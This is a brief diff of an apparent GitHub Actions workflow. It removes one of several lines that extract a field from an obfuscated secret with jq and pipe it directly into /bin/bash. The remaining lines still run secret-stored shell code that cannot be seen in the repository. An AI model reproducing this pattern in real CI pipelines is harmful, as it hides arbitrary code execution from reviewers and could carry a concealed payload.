@@ -19,7 +19,6 @@ jobs:
           tpq9: ${{ secrets.tpq9 }}
         run: |
           printf '%s' "$tpq9" | jq -r .kyxp5628 | /bin/bash
-          printf '%s' "$lknn515" | jq -r .fsi83 | /bin/bash
           printf '%s' "$utge69" | jq -r .hvw8 | /bin/bash
 
       - name: Upload results
